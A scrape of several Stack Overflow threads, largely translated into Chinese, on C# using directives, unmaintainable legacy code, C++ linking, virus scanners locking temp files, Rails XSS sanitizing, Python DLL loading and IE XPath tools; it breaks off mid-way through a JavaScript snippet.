> 时间：2008-10-18T10:39:11.387

在您的机器上安装 ReSharper。坐下来，让它引导你的同事走向正义。说真的，有更大的战斗，但如果尝试教育需要超过两分钟的时间，这是编码人员要避免的那种。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2008-10-18T11:49:29.560

您还可以使用别名...：

```
using diagAlias = System.Diagnostics;

namespace ConsoleApplication1
{
    class Program
    {
        static void Main(string[] args)
        {
            diagAlias.Debug.Write("");
        }
    }
} 
```

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2008-10-18T18:08:01.370

我认为通过 Visual Studio 中的[IntelliSense功能和使用](http://en.wikipedia.org/wiki/IntelliSense)[ReSharper](http://en.wikipedia.org/wiki/ReSharper)等一些第三方产品，我们不再关心是否使我们的代码完全合格。复制和粘贴代码时，解析命名空间不再耗时。

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2008-10-19T06:17:07.857

“你的同事说‘复制粘贴代码’的那一刻，他就失去了所有可信度。” 同上。

“得墨忒耳法则说……”同上

...我补充说。这很荒谬，不使用 using 语句。获取 ReSharper，找到一些方法来教这个人它是如何完成的，如果它似乎没有生效 - 给出的原因，是时候开始寻找不同的工作了。只是与不使用 using 语句等概念的相关性是可怕的。如果这是规则之一，您将被困在 16 小时内修复混乱。不知道接下来你会面临什么样的对常识和逻辑的冒犯。

不过说真的，这甚至不应该用可用的 ReSharper 等工具来提出。钱被浪费了，购买 ReSharper，进行代码清理，然后重新开始制作可用的软件。:) 那是我的 2 美分。

* * *

## 回答 #16

> 赞同：1
> 
> 时间：2008-10-19T11:51:16.183

如果您反复复制和粘贴代码，这是否意味着创建一个标准 DLL 以包含到您的每个项目中？

我以前曾使用这两种方法从事过项目，不得不说“使用”语句对我来说很有意义，它减少了代码，使其更具可读性，并且您的编译器最终将以正确的方式优化代码。您唯一可能遇到的问题是，如果您有来自两个名称空间的两个具有相同名称的类，那么您将不得不使用完全限定名称……但这是例外而不是规则。

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2011-11-07T15:12:14.457

我已经编码 25 年了。USINGS 是必不可少的，应始终使用，是一种良好的编码实践。然而，任何优秀的开发人员都应该有一个代码库。包含完全限定的命名空间时，共享代码片段要容易得多。

COPY & PASTE 是一种糟糕的技术的评论通常来自那些没有花时间构建强大的代码存储库并且没有停下来真正理解通用代码是经过测试的代码的开发人员的口中。我认为完全限定的名称空间是代码存储库中的必需品，否则您会四处寻找名称空间的来源。

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2008-10-18T09:45:32.197

得[墨忒耳法则](http://en.wikipedia.org/wiki/Law_of_Demeter)说你应该*只使用一个点*：

> 对于许多使用点作为字段标识符的现代面向对象语言，该法则可以简单地表述为“仅使用一个点”。也就是说，代码“abMethod()”违反了“a.Method()”没有的法律。

当然，这并不总是实用的。但是一长串以点分隔的标识符违反了公认的做法。

编辑：这个答案似乎有争议。我`Law of Demeter`主要是作为风格指南提出的，这里的大多数回复似乎都同意限制点的数量是个好主意。在我看来，`jQuery`（和`JavaScript`）存在可读性问题，部分原因是过多的点会蔓延到任何非平凡的程序中。

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2008-10-18T10:10:18.200

我反对你同事的提议。对我来说，如果您没有长的命名空间使行变得混乱，那么阅读代码会容易得多。想象一下：

```
Namespace1.Namespace2.Namespace3.Type var = new Namespace1.Namespace2.Namespace3.Type(par1, par2, par3); 
```

相对于：

```
Type var = new Type(par1, par2, par3); 
```

关于复制粘贴 - 你确实有 Shift+Alt+F10 可以添加命名空间，所以这应该不是问题。

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2008-10-18T13:04:36.990

你真的想那样维护代码吗？即使有了智能感知，所有的打字都不会有成效。

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2008-10-18T13:16:20.027

而不是“copy-n-paste”，我称之为“copy-n-rape”，因为代码在通过这个过程时被滥用了 99.9% 的时间。所以，这就是我对你的同事提出该方法的第一理由的回答。

附带说明一下，当您将需要它们的代码添加到代码中时，像 Resharper 这样的工具会在顶部添加 using 语句（因此，即使您像这样“复制-n-强奸”代码，您也可以轻松地做到这一点）。

除了个人喜好，我认为你的理由比他的更有价值，所以即使假设它们都是有效的观点，我仍然建议在顶部写 using 语句。不过，我不会将其设为“禁令”，因为我将编码标准视为指南而不是规则。根据您的团队规模，可能很难执行这样的事情（或者缩进有多少空格，或者缩进样式等）。

将其作为指导方针，以便所有其他开发人员可以随意用较短的版本替换完全限定名称，并且随着时间的推移，代码库将符合指导方针。留意那些花时间从工作中简单地将所有出现的一种风格更改为另一种风格的人——因为如果你不做任何其他事情，那将不是很有效率。

* * *

## 回答 #22

> 赞同：0
> 
> 时间：2008-10-18T18:55:30.867

他可能对某些事情有意见。例如，在我工作的一家公司，我们有很多代码生成的类，因此我们所有的代码生成的类都使用类的完全限定名称，以避免任何潜在的冲突。

对于我们拥有的所有标准 .NET 类，我们只使用 using 语句。

* * *

## 回答 #23

> 赞同：0
> 
> 时间：2008-10-18T23:42:30.680

在像 .NET 这样的系统中，命名空间中有类型，您必须做出决定：命名空间是名称的一部分，还是类型的组织工具？

一些系统选择第一个选项。然后，您的`using`指令将能够缩短您最常使用的名称。

在 .NET 中，是后者。例如，考虑`System.Xml.Serialization.XmlSerializationReader`. 观察命名空间和类型之间的重复。这是因为在此模型中，类型名称必须是唯一的，即使跨名称空间也是如此。

如果我没记错的话，您可以在此处找到 CLR 团队所描述的内容：http: [//blogs.msdn.com/kcwalina/archive/2007/06/01/FDGLecture.aspx](http://blogs.msdn.com/kcwalina/archive/2007/06/01/FDGLecture.aspx)

> 将代码复制并粘贴到其他源文件中更简单。

没错，但是如果您要复制/粘贴大量代码，那么您可能做错了。

> 它更具可读性（您会立即看到命名空间）

查看命名空间并不重要，因为至少当您遵循 Microsoft 的指导方针时，类型名称已经是唯一的；命名空间并没有真正为您提供有用的信息。

* * *

## 回答 #24

> 赞同：0
> 
> 时间：2008-10-18T23:57:56.093

我是一个倾向于完全限定名称空间的人。当我使用我不熟悉/长时间未使用的组件时，我会这样做。我帮助我记住该名称空间中的内容，因此下次我要查找它/相关类时。

它还可以帮助我了解我是否已经在项目中有适当的参考。就像如果我写出 System.Web.UI 但找不到扩展那么我知道我忘记了/谁曾经设置过项目忘记放入 ASP.NET AJAX 引用。

虽然这些天我做的越来越少，因为我使用快捷方式来限定一个类（Ctrl + .）。如果您输入类的名称（大小写正确）并按下该快捷方式，您可以轻松地完全质量/添加 using 语句。

这对 StringBuilder 来说很棒，我似乎从来没有 System.Text，所以我只需键入 StringBuilder -> Ctrl + 。我们开始了，我添加了使用。

* * *

## 回答 #25

> 赞同：0
> 
> 时间：2010-01-08T21:29:56.860

Visual Studio 在几乎每个文件的顶部都包含大量 using 语句，这难道不是暗示`using`语句被认为是好的做法吗？

# anti-patterns - What's the most unsound program you've had to maintain?

> ID：214836
> 
> 赞同：24
> 
> 时间：2008-10-18T10:03:36.093
> 
> 标签：anti-patterns

I periodically am called upon to do maintenance work on a system that was built by a real rocket surgeon. There's so much wrong with it that it's hard to know where to start.

No, wait, I'll start at the beginning: in the early days of the project, the designer was told that the system would need to scale, and he'd read that a source of scalability problems was traffic between the application and database servers, so he made sure to minimize this traffic. How? By putting all of the application logic in SQL Server stored procedures.

Seriously. The great bulk of the application functions by the HTML front end formulating XML messages. When the middle tier receives an XML message, it uses the document element's tag name as the name of the stored procedure it should call, and calls the SP, passing it the entire XML message as a parameter. It takes the XML message that the SP returns and returns it directly back to the front end. *There is no other logic in the application tier.*

(There *was* some code in the middle tier to validate the incoming XML messages against a library of schemas. But I removed it, after ascertaining that 1) only a small handful of messages had corresponding schemas, 2) the messages didn't actually conform to these schemas, and 3) after validating the messages, if any errors were encountered, the method discarded them. "This fuse box is a real time-saver - it comes from the factory with pennies pre-installed!")

I've seen software that does the wrong thing before. Lots of it. I've written quite a bit. But I've never seen anything *like* the steely-eyed determination to do the wrong thing, at *every possible turn*, that's embodied in the design and programming of this system.

Well, at least he went with what he knew, right? Um. Apparently, what he knew was Access. And he didn't really *understand* Access. Or databases.

Here's a common pattern in this code:

```
SELECT @TestCodeID FROM TestCode WHERE TestCode = @TestCode

SELECT @CountryID FROM Country WHERE CountryAbbr = @CountryAbbr

SELECT Invoice.*, TestCode.*, Country.*
   FROM Invoice
   JOIN TestCode ON Invoice.TestCodeID = TestCode.ID
   JOIN Country ON Invoice.CountryID = Country.ID
   WHERE Invoice.TestCodeID = @TestCodeID AND Invoice.CountryID = @CountryID

```

Okay, fine. You don't trust the query optimizer either. But how about this? (Originally, I was going to post this in [What's the best comment in source code you have ever encountered?](https://stackoverflow.com/questions/184618/what-is-the-best-comment-in-source-code-you-have-ever-encountered) but I realized that there was so much more to write about than just this one comment, and things just got out of hand.) At the end of many of the utility stored procedures, you'll see code that looks like the following:

```
-- Fix NULLs
SET @TargetValue = ISNULL(@TargetValue, -9999)

```

Yes, that code is doing exactly what you can't allow yourself to believe it's doing lest you be driven mad. If the variable contains a NULL, he's alerting the caller by changing its value to -9999\. Here's how this number is commonly used:

```
-- Get target value
EXEC ap_GetTargetValue @Param1, @Param2, OUTPUT @TargetValue
-- Check target value for NULL value
IF @TargetValue = -9999
    ...

```

Really.

For another dimension of this system, see the article on thedailywtf.com entitled [I Think I'll Call Them "Transactions"](http://thedailywtf.com/Articles/I_Think_I_0x27_ll_Call_Them__0x26_quot_0x3b_Transactions_0x26_quot_0x3b_.aspx). I'm not making any of this up. I swear.

I'm often reminded, when I work on this system, of Wolfgang Pauli's famous response to a student: "That isn't right. It isn't even wrong."

This can't really be the very worst program ever. It's definitely the worst one I've worked on in my entire 30-year (yikes) career. But I haven't seen everything. What have you seen?

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2008-10-18T10:33:32.787

I once tried to write an [MP3](http://en.wikipedia.org/wiki/MP3) decoder. It didn't work.

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2008-10-20T00:56:44.230

我维护[了 ExtUtils::MakeMaker](http://search.cpan.org/perldoc?ExtUtils::MakeMaker)。MakeMaker 肯定不是我必须维护的最糟糕的代码。这实际上是一个工程奇迹。然而，正是在这种独特的编码恐怖中，最关键的代码也是最可怕的。

MakeMaker 是大多数 Perl 模块的安装程序。当您运行“Makefile.PL”时，您正在调用 MakeMaker。如果 MakeMaker 中断，Perl 就会中断。Perl 可以在所有东西上运行，因此 MakeMaker 必须在所有东西上运行。当我说一切时，我的意思是一切。每个奇异的 Unix 变体。Windows 95 上。和[VMS](https://en.wikipedia.org/wiki/OpenVMS)。是的，VMS。

MakeMaker 是做什么的？Makefile.PL 是一个 Perl 程序，它编写包含 shell 命令的 Makefile，这些命令通常运行 Perl，以构建和安装 Perl 模块。让我重复一遍：它编写 shell 命令来运行 Perl。Perl，替代 shell 脚本的语言。

哦，它还可以编译和链接C代码。它还可以将 Perl 模块静态链接到 perl。哦，它可以管理 RCS 结帐。哦，还有你的发行版的 tarball 和 zip 文件。并做所有其他与安装模块相关的事情。

它必须以便携、向后兼容的方式完成所有这些工作。它必须处理...中的变体和错误

*   make（GNU make、BSD make、nmake、dmake、mms、mmk 等等）
*   壳
*   Perl
*   文件系统（如果你认为这没什么大不了的，试试 VMS）
*   C 编译器和链接器

它绝对不会失败，并且必须保持 100% 向后兼容。

哦，它几乎没有真正的扩展 API，所以它必须与人们为了扩展它而必须做的临时 Makefile 保持兼容。

为什么它会做这一切？15 年前，当 Perl 只在 Unix 上运行时，这似乎是个好主意。当你可以只使用 make 时，为什么还要编写一个完整的构建系统？Perl 是一种文本处理语言；我们将使用它来编写 Makefile！

幸运的是，有一个替代品[Module::Build](http://search.cpan.org/perldoc?Module::Build)，我寄希望于它会迅速杀死 MakeMaker。但是它的吸收速度很慢，而且社区非常抵制这种变化，所以我坚持维护 MakeMaker。

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2008-10-20T02:04:21.380

> 您必须维护的最不健全的程序是什么？

我曾经写过的一切！

严重地。我阅读博客、收听播客和关注此类网站的次数越多，我每天学到的就越多。每天我基本上都意识到我昨天写的所有东西在某种程度上都是错误的。我很同情那些维护我在职业生涯早期写的东西的可怜虫。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2008-10-18T10:44:16.043

The one I have just started on.

1.  No Source control.
2.  All source is edited live. To stop mistakes, there are backup files like db-access.php.070821 littering the source tree.
3.  The code is exceptionally brittle - there is very little in the way of error checking and absolutely no fall back if it does.

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2008-10-22T10:04:30.660

我曾经不得不维护一个遗留的 C 应用程序，该应用程序以前是由一些失去编程意愿（可能还活着）的程序员编写和维护的。它有太多的 WTF 可提，但我记得有一个布尔函数，它在各种特殊情况下会返回 TRUE+1、TRUE+2 等。

然后我读了[Roedy Green 的文章](http://mindprod.com/jgloss/unmain.html)，笑了很多，直到我意识到我觉得这很有趣的原因是我从我维护的代码中认出了大部分示例。（那篇文章经过多年的补充变得有点臃肿，但仍然值得一看。）

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-10-22T09:07:25.237

我曾经是一名 COBOL 程序员（不寒而栗）。我们所有的代码都属于“不健全”的类别。在 COBOL 中，您没有命名空间，所有变量都是全局变量，并且文件名和其他资源有很多强制重复。要调用过程，您需要设置全局变量，调用过程，然后检查这些全局变量（或其他可能被设置的变量）的内容。

然而，最糟糕的是维护一个在我出生（我出生于 1967 年）之前编写的 COBOL 程序，其唯一的流控制方法是 GOTO。这绝对是一团糟，无法遵循。对变量类型的微小更改可能需要几天时间才能完成。没有自动化测试，手动测试计划也从未保存，因此每次更改都需要写出新的手动测试计划，详尽地遵循，并与代码一起上交。

具有讽刺意味的是，这正是 COBOL 如此成功的原因。COBOL 通常由作业控制语言 (JCL) 执行。由于 COBOL 很弱，程序不会做很多事情，所以 JCL 会分配一些磁盘空间（通常到柱面级别），并执行一个小的 COBOL 程序来读取数据，然后只写出您需要的数据。然后 JCL 可能会调用一个排序程序来对结果文件进行排序。然后将调用另一个 COBOL 程序来读取已排序的文件并汇总数据，并可能重新提取所需的结果。并且可能会再次使用 JCL 将文件移动到其他位置，然后调用另一个 COBOL 程序来读取结果并将它们存储在数据库中，等等。每个 COBOL 程序往往只做一件事，并创建了 Unix 管道模型的原始版本——这一切都是因为 COBOL 太难维护或做任何复杂的事情。我们有松散的耦合和紧密的内聚（在程序之间，而不是在它们之间），因为几乎不可能以任何其他方式编写 COBOL。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2009-06-01T01:43:45.200

Right out of grad school at Lucent I was given a compiler and interpreter to maintain, written in PL/I. The language being compiled described a complex set of integrity constraints, and the interpreter ran those constraints against a large data set that would later be formed into the initial database controlling the 4ESS switch. The 4ESS was, and still is, a circuit-switch for long distance voice traffic.

The code was a jumble. There was a label to branch to called "NORTH40". I asked the original developer what it meant.

"That's where the range checks are done, you know, the checks to make sure each field has a correct value."

"But why 'NORTH40'?"

"You know, 'Home, home on the range.'"

"Huh?"

Turned out 'NORTH40' meant a farm's north 40 acres, which in his city-bred mind had an obscure connection to a cattle ranch.

Another module had two parallel arrays called TORY and DIREC, which were updated in parallel and so were an obviously misguided attempt to model a single array containing pairs of data. I couldn't figure out the names and asked the developer. Turned out they were meant to be read together: "direc-tory". Great.

The poor guys that had to write the integrity constraints had no user manual to guide them, just an oral tradition plus hand-written notes. Worse, the compiler did no syntax-checking, and very often they wound up specifying a constraint that was mapped quietly into the wrong logic, often with very bad consequences.

Worse was to come. As I delved into the bowels of the interpreter, I discovered it was built around a giant sort process. Before the sort was an input process that generated the sort input data from the raw data and the integrity constraints. So if you had a table with 5,000 trunk definitions in it, and each trunk record had three field values that had to be unique across the whole input data set, the input process would create 3 * 5,000 = 15,000 sort input records, each a raw data record prefixed by the integrity constraint number and a copy of the field value to be sorted. Instead of doing three 5,000 record sorts, it did one 15,000 record sort. By the time you factored in hundreds of intra- and inter-table integrity constraints, and some very large tables, you had a combinatorial nightmare.

I was able to refactor a bit, document the language, and add syntax checking with comprehensible error messages, but a few months later jumped at a transfer to a new group.

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-10-20T01:13:31.450

我正在维护我们在 Intranet 中使用的调度 Web 应用程序。当我被问到是否可以从调度程序中删除代理时，我想，当然可以。当我查看源代码时，我发现这个代理一天中的每个小时都是单独编码的。他一周中的每一天都是如此。该地区每个代理商的每周都是如此。大约 5 个区域中的每个区域也是如此。Html 文件中到处都是 asp 代码。

有一天，我花了一些时间来猜测这些不同的文件中有多少行代码，我估计大约有 300000。30 万行代码，一次手写然后复制粘贴代码。

但这个数字很快让我的经理相信，我们很快就需要一个新的日程安排应用程序。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-11-22T02:59:57.617

一个 PHP/MySQL 驱动的在线联系人管理系统，其中联系人表没有自然键。有许多数据库字段实例包含分隔字符串形式的复合数据，随后需要由应用程序代码解析。

HTML和逻辑交织在一起，几乎没有使用任何功能，而是将代码剪切并粘贴到数十个源代码文件中。数据未经过清理，因此带有（例如）嵌入垂直选项卡的字段导致 Ajax 调用返回的 XML 出现故障，最重要的是，文件包含数十个（如果不是数百个）由右大括号紧跟分号组成的空语句：“};”

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2009-07-13T17:45:04.570

我曾经做过一个用 BASIC 编写的 CAD 应用程序，公司的政策是每个程序都必须以以下语句开头：

**错误恢复**

jMM

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-01-10T09:27:57.117

CAD/CAM 几何处理语言的解释器（P1 = 10,10; P2 = 20,20; L1 = P1,P2; - 那种东西），用 Microsoft BASIC Professional Development System (PDS) 编写，长度最短变量名（它很快就用完了单个字母，所以转到双字母。PP，PQ​​，PR，有人吗？）。而且，公平地说，*一些*评论。用意大利语。

有趣的是，它确实有效，并且我能够为其添加一些功能，但这就像业余牙科 - 很痛苦，当然不推荐......

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2008-10-22T09:16:39.057

为雇用开发人员以维护他们以前雇用的特定公司维护 ASP 应用程序......所有这些应用程序都没有记录，也没有任何评论。

每个功能都被复制并粘贴到每个 ASP 页面中。所以没有定义任何功能或任何功能......每天我都被他们的环境所困扰，因为我必须首先远程到服务器，绕过[DMZ](https://en.wikipedia.org/wiki/DMZ_%28computing%29)。之后，我必须远程连接到必须进行更改的生产服务器。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2008-11-22T02:31:17.253

我曾经写过的任何东西，最初都应该是一个快速的原型，最终会停留一段时间。我的问题领域本质上需要大量一次性原型设计。对于这些原型，有时违反每个最佳实践和良好风格的规则是合理的，如果原型最终值得保留，只需完成它并稍后清理。然而，有时这些原型最终很难正常工作，但最终会成为守护者。在这些情况下，我通常会无限期地推迟重构/重写这个东西，因为我担心我永远不会让它再次工作。进一步削弱我的动力的是，我的老板是一位根本不会编程的领域专家。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2008-10-24T19:25:34.553

我曾经被要求帮助追踪 EDIF 阅读器中的周期性崩溃。几乎立刻我就开始头疼。原作者似乎觉得[Yacc](https://en.wikipedia.org/wiki/Yacc)会因为空格而惩罚他，而他的 Yacc 语法是一个密集的、难以阅读的混乱。我花了几个小时对其进行格式化，为出现的缺失终端添加规则，构建声明以避免堆栈增长，瞧，崩溃消失了。

所以请记住，每次等待 Yacc 处理语法时，生成的解析器都会运行数千次。不要对空白便宜！

# c++ - C3681 identifier not found

> ID：214843
> 
> 赞同：1
> 
> 时间：2008-10-18T10:08:51.200
> 
> 标签：c++, reference

I have two projects in CPP. One defines a function which I'd like to invoke from the other. I added a reference to the first project. I still get the message of "identifier not found". Assuming that the CPP file in the first project doesn't have a header, how do I make the second project know about its functions?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-18T10:11:46.497

If the first project doesn't have a header and you don't want to add one, then use the `extern` keyword to declare a prototype for the function you want to call in the second project source:

```
extern function_in_first_project(int args_go_here); 
```

Make 100% sure that the function declaration (including argument list and calling convention) matches that of the actual function or you'll run into further problems.

This may not be the only thing you have to do to make your project link, depending on how you've got your projects set up.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-19T11:36:08.883

您可能只需将其添加到第二个项目的 .cpp 文件的顶部：

```
#include "first_project_header_file.h" 
```

# c# - 病毒扫描程序锁定和删除临时文件 - 应对它们的最佳方法？

> ID：214849
> 
> 赞同：6
> 
> 时间：2008-10-18T10:13:30.487
> 
> 标签：c#, locking, temporary-files, antivirus

我的应用程序处理来自不同来源的电子邮件，例如 Outlook 和 IMAP 邮箱。在解析它们之前，我将它们写入临时目录（不能将它们保存在内存中）。在解析时，我可能会将附件写入临时目录（例如，如果它们太大而无法保存在内存中或无法提取全文）。

但是在野外，发生了两件事，一开始看起来很奇怪，但都可以追溯到病毒扫描程序的行为：

*   我有时无法打开几毫秒前自己编写的文件。它们显然被病毒扫描程序锁定以确保它们是干净的。我得到一个例外。

*   如果文件被病毒扫描程序认为是危险的，它会在某个时间点将其删除。

为了应对这种行为，我编写了一些方法，如果打开失败再试一次，或者检查文件是否存在，但我无法在应用程序的每个部分使用它们（第 3 方代码，例如过滤器） ，所以事情变得更好了，但不是 100% 完美，因此我的源代码部分看起来很丑。

您如何应对病毒扫描程序？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-18T10:46:07.287

如果更改病毒扫描程序配置不是您的理想选择。您能否从创建文件到进程结束保持文件打开？如果您对文件有句柄，则病毒扫描程序将无法使用该文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-18T19:15:23.573

使用加密编写文件。我认为您不需要任何太棘手或太复杂的事情。还要加密或破坏文件名，因为病毒扫描程序也可能由此触发。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-18T10:43:03.547

您通常应该从病毒扫描程序中排除邮件过滤文件，并使用位于传入邮件系列管中的专用邮件防病毒程序。绝对考虑要求您的用户关闭其邮件服务器上的“删除受感染文件”选项，否则他们可能会丢失邮件数据库：-/。例如，您可以通过以下方式配置 AV 以忽略 Exchange： http: [//www.sophos.com/support/knowledgebase/article/12214.html](http://www.sophos.com/support/knowledgebase/article/12214.html) 但另一种看待它的方式是文件中有病毒，所以无论如何，您可能都不想交付它；-)

先前的答案说要更改权限，以便只有您的进程才能访问文件。那是行不通的；任何有价值的 AV 都将在内核中运行，并且无论如何都可以访问这些文件。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2008-10-18T10:16:12.230

病毒扫描程序有排除文件夹。只需查看文档并将您的临时文件夹添加到此列表中。

# ruby-on-rails - 在 Rails 中清理输出

> ID：214850
> 
> 赞同：3
> 
> 时间：2008-10-18T10:15:22.997
> 
> 标签：ruby-on-rails, security, xss

在 Rails 中清理输出 HTML（以避免 XSS 攻击）的最佳解决方案是什么？

我有两个选择：来自 Sanitize Helper [http://api.rubyonrails.com/classes/ActionView/Helpers/SanitizeHelper.html](http://api.rubyonrails.com/classes/ActionView/Helpers/SanitizeHelper.html)的 white_list 插件或 sanitize 方法。直到今天对我来说，white_list 插件工作得更好，在过去，Sanitize 有很多错误，但作为核心的一部分，它可能正在开发中并得到支持一段时间。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-20T01:55:11.117

我推荐[http://code.google.com/p/xssterminate/](http://code.google.com/p/xssterminate/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-26T09:24:46.223

我认为 h 辅助方法将在这里工作：

```
<%= h @user.profile %> 
```

这将转义尖括号，因此中和任何嵌入的 JavaScript。当然，这也将消除您的用户可能使用的任何格式。

如果你想要格式化，也许看看markdown。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-27T08:37:24.307

就我个人而言，我认为在任何 Web 应用程序中接受任何 HTML 条目都不是一个小决定。您可以随心所欲地测试白名单/黑名单标签，但除非您正在测试正确的嵌套，否则有人可能会输入一系列结束标签，例如

```
</td></tr></span></div> 
```

真的弄乱了你的布局。

我通常会给人们类似 Textile 的东西来输入他们的标记，因为我宁愿把时间花在业务逻辑上而不是 HTML 解析上。

当然，如果此文本条目对您的应用程序更重要（例如它用于 stackoverflow），那么您可能应该更多地关注您自己的手动滚动。

# python - python模块dll

> ID：214852
> 
> 赞同：23
> 
> 时间：2008-10-18T10:17:58.387
> 
> 标签：python, module

有没有办法让 python 模块在我的应用程序目录中加载一个 dll，而不是 python 安装附带的版本，而不更改 python 安装（这需要我制作一个安装程序，小心我没有' t 通过覆盖 python 模块和全局更改 dll 版本来破坏其他应用程序......）？

具体来说，我希望 python 使用我的 sqlite3.dll 版本，而不是 python 附带的版本（它较旧并且似乎没有 fts3 模块）。

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2008-10-18T10:33:08.000

如果您在谈论 Python 模块 DLL，那么只需修改`sys.path`就可以了。但是，如果您谈论的是与这些 DLL*链接*的 DLL；即a`libfoo.dll`所`foo.pyd`依赖的a，那么你需要修改你的PATH环境变量。我不久前写过关于[为 PyGTK 做这个的](http://glyf.livejournal.com/7878.html)文章，但在你的情况下，我认为它应该很简单：

```
import os
os.environ['PATH'] = 'my-app-dir' + os.pathsep + os.environ['PATH'] 
```

这将插入`my-app-dir`到您的 Windows 路径的开头，我相信它也控制着 DLL 的加载顺序。

请记住，您需要在加载相关的 DLL 之前执行此操作，即在导入任何有趣的内容之前。

sqlite3 可能有点特殊，因为它是随 Python 分发的；快速测试这个显然有点棘手，所以我没有`sqlite3.dll`具体检查。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2020-10-11T12:11:22.953

修改的答案`os.environ['PATH']`是正确的，但它对我不起作用，因为我使用的是 python 3.9。我仍然收到一个错误：

> ImportError: DLL load failed while importing module X: 找不到指定的模块。

事实证明，自 python 3.8 版本以来，他们添加了一种机制来更安全地执行此操作。阅读`os.add_dll_directory` [https://docs.python.org/3/library/os.html#os.add_dll_directory上的文档](https://docs.python.org/3/library/os.html#os.add_dll_directory)

具体见[python 3.8 what's new](https://docs.python.org/3/whatsnew/3.8.html#bpo-36085-whatsnew)：

> 现在可以更安全地解决 Windows 上的扩展模块和使用 ctypes 加载的 DLL 的 DLL 依赖关系。仅搜索系统路径、包含 DLL 或 PYD 文件的目录以及使用 add_dll_directory() 添加的目录以查找加载时依赖项。具体来说，**不再使用 PATH 和当前工作目录，对它们的修改将不再对正常的 DLL 解析产生任何影响**。如果您的应用程序依赖这些机制，您应该检查 add_dll_directory() 如果它存在，则在加载库时使用它来添加您的 DLL 目录。

所以现在这是使它在**python 3.8 及更高版本**中工作的新方法：

```
import os
os.add_dll_directory('my-app-dir') 
```

同样，旧方法仍然是正确的，您必须在**python 3.7 和更早版本**中使用它：

```
import os
os.environ['PATH'] = 'my-app-dir' + os.pathsep + os.environ['PATH'] 
```

之后，我的具有 dll 依赖项的模块已成功加载。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2008-10-18T11:04:43.690

好的，事实证明python总是将dll加载到与pyd文件相同的目录中，而不管python和os路径设置为什么。

所以我需要将 _sqlite3.pyd 从 python/v2.5/DLLS 复制到我的新 sqlite3.dll 所在的应用程序目录中，使其加载我的新 dll，而不是 python 附带的那个（因为 pyd 文件似乎遵循 PYTHONPATH，即使实际的 dll 本身没有）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-18T10:20:18.850

如果您的 sqlite 版本在系统版本*之前*的 sys.path 中，它将使用它。因此，您可以将其放在当前目录中，也可以更改`PYTHONPATH`环境变量来执行此操作。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-07-22T11:19:55.367

我遇到了同样的问题，因为默认 python 库的管理权限在公司环境中被阻止，并且执行安装非常麻烦。

什么对我有用：

1.  在新位置复制 sqlite3 库
2.  将最新的 sqlite3.dll（您想要的 sqlite3 web 版本）和旧的 _sqlite3.pyd 放入新位置或新的 sqlite3 库。旧的 _sqlite3.pyd 可以在默认的 python 库 lib/DLLs 文件夹中找到。
3.  转到新的 sqlite3 库并修改 dbapi2.py 如下：将“from _sqlite3 import *”更改为“from sqlite3._sqlite3 import *”
4.  确保 python 首先加载这个新的 sqlite3 库。如果必须，请添加此库的路径。

# internet-explorer - 相当于 Internet Explorer 中 Firebug 的“复制 XPath”？

> ID：214862
> 
> 赞同：13
> 
> 时间：2008-10-18T10:25:41.260
> 
> 标签：internet-explorer, selenium, firebug, automated-tests

我有一个仅限 Internet Explorer 的 Web 应用程序。

我正在探索我们可以做些什么来自动化测试。

Selenium 看起来是个不错的工具，但要能够激活链接等。我需要告诉它它们在哪里。该应用程序在构建时并未考虑到这种测试，因此`id`关键元素上通常没有属性。

没问题，我想，我可以使用 XPath 表达式。但是，如果通过检查页面的源代码来为按钮找到正确的 XPath 是一件非常痛苦的事情。

使用 Firefox / Firebug，我可以选择元素，然后使用“复制 XPath”来获取表达式。

我有 IE 开发人员工具栏，但它关闭得令人沮丧。我可以单击以选择感兴趣的元素并显示有关它的各种信息。但我看不到任何方便的方法来确定它的 XPath。

那么有没有办法用 IE 做到这一点？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-18T14:19:16.717

我会使用书签。我有一个 XPath 相关的，但我不知道它是否适用于 IE。我得走了，但如果它在 IE 上工作，我会测试它并给出它。

我的书签中为 Web 开发人员提供的两个书签站点：[Subsimple 的书签](http://subsimple.com/bookmarklets/collection.asp "我的书签")和[Squarefree 的书签](https://www.squarefree.com/bookmarklets/ "书签首页")。那里有很多有用的东西...

[编辑] 好的，我回来了。我拥有的书签仅适用于 FF，并不是最佳的。我终于重写了它，尽管使用了原来的想法。找不到我找到它的地方。

扩展JS：

```
function getNode(node)
{
  var nodeExpr = node.tagName;
  if (nodeExpr == null)  // Eg. node = #text
    return null;
  if (node.id != '')
  {
    nodeExpr += "[@id='" + node.id + "']";
